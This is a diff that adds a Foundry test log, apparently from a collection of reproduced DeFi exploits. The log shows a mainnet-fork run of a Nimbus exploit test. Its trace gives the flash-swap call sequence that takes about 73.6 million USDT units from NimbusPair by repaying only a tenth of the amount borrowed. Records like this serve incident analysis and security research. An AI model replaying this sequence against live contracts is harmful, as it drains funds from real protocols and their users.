@@ -1,0 +1,71 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Nimbus_exp.sol:ContractTest
+[PASS] testExploit() (gas: 155552)
+Logs:
+  Before exploiting 0
+  After exploiting 73601019
+
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 13225516 [1.322e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [161152] ContractTest::testExploit()
+    ├─ [5031] TetherToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Before exploiting", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [3031] TetherToken::balanceOf(NimbusPair: [0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1]) [staticcall]
+    │   └─ ← [Return] 82604959 [8.26e7]
+    ├─ [133376] NimbusPair::swap(81778909 [8.177e7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000004dfd8dd)
+    │   ├─ [35601] TetherToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81778909 [8.177e7])
+    │   │   ├─ emit Transfer(from: NimbusPair: [0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 81778909 [8.177e7])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x0000000000000000000000000000000000000000000000000000000004dfd8dd
+    │   │   │   @ 0xcbc71bdd2c582a26e96960726b4f33f603a68b6f4a1cfd31a3f084c1f7652e28: 0x0000000000000000000000000000000000000000000000000000000004ec739f → 826050
+    │   │   └─ ← [Stop]
+    │   ├─ [9181] ContractTest::NimbusCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81778909 [8.177e7], 0, 0x0000000000000000000000000000000000000000000000000000000004dfd8dd)
+    │   │   ├─ [6901] TetherToken::transfer(NimbusPair: [0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1], 8177890 [8.177e6])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NimbusPair: [0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1], value: 8177890 [8.177e6])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xcbc71bdd2c582a26e96960726b4f33f603a68b6f4a1cfd31a3f084c1f7652e28: 826050 → 0x00000000000000000000000000000000000000000000000000000000008963a4
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x0000000000000000000000000000000000000000000000000000000004dfd8dd → 0x0000000000000000000000000000000000000000000000000000000004630ffb
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [1031] TetherToken::balanceOf(NimbusPair: [0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1]) [staticcall]
+    │   │   └─ ← [Return] 9003940 [9.003e6]
+    │   ├─ [4817] NBU::balanceOf(NimbusPair: [0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1]) [staticcall]
+    │   │   └─ ← [Return] 280901368924817109893 [2.809e20]
+    │   ├─ [2413] 0x56E75d45ea19fA96844C51994Ade3CFf65f3E209::nimbusReferralProgram() [staticcall]
+    │   │   └─ ← [Return] 0x000000000000000000000000e5ad1a7c9ecfd77c856c211fd5df26a04a72c365
+    │   ├─ [9701] TetherToken::transfer(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, 12303 [1.23e4])
+    │   │   ├─ emit Transfer(from: NimbusPair: [0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1], to: 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, value: 12303 [1.23e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xcbc71bdd2c582a26e96960726b4f33f603a68b6f4a1cfd31a3f084c1f7652e28: 0x00000000000000000000000000000000000000000000000000000000008963a4 → 0x0000000000000000000000000000000000000000000000000000000000893395
+    │   │   │   @ 0x48a28634810a18f48b75cea1cc2238ff0ce7b137a02eeda7173d842b1ce74112: 0x00000000000000000000000000000000000000000000000000000000fa0f77d5 → 0x00000000000000000000000000000000000000000000000000000000fa0fa7e4
+    │   │   └─ ← [Stop]
+    │   ├─ [22281] 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365::recordFee(TetherToken: [0xdAC17F958D2ee523a2206206994597C13D831ec7], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12303 [1.23e4])
+    │   │   ├─ [1031] TetherToken::balanceOf(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365) [staticcall]
+    │   │   │   └─ ← [Return] 4195330020 [4.195e9]
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xefb74c0b5df341ef023f4c835e600b355d2657878feeb572379802b4332b621b: 0x00000000000000000000000000000000000000000000000000000000e6a6e7f4 → 0x00000000000000000000000000000000000000000000000000000000e6a71803
+    │   │   │   @ 0xe6e1804945c667f9190787ad0bb70223ba62d97980d113eb0e459576b1e2e096: 0x00000000000000000000000000000000000000000000000000000000fa0f77d5 → 0x00000000000000000000000000000000000000000000000000000000fa0fa7e4
+    │   │   └─ ← [Stop]
+    │   ├─ emit Sync(reserve0: 8991637 [8.991e6], reserve1: 280901368924817109893 [2.809e20])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 8177890 [8.177e6], amount1In: 0, amount0Out: 81778909 [8.177e7], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x60d707de00000000000f3a4a22c204acb3850000000000000000000004ec739f → 0x6140ee4a00000000000f3a4a22c204acb3850000000000000000000000893395
+    │   │   @ 10: 0x0000000000000000000000000000000000000000bba8cfc014d2fe578ca18003 → 0x0000000000000000000000000000000000000000dde68c10137aec62a89cf5f3
+    │   │   @ 9: 0x00000000000000000000e88bb8fa5e628cce5172a3f2fa8be7901c8b2d2f0f57 → 0x00000000000000000002301213bb27833851d847217898029d60e4869a104dbb
+    │   └─ ← [Stop]
+    ├─ [1031] TetherToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 73601019 [7.36e7]
+    ├─ [0] console::log("After exploiting", 73601019 [7.36e7]) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.78s (5.71s CPU time)
+
+Ran 1 test suite in 8.37s (6.78s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
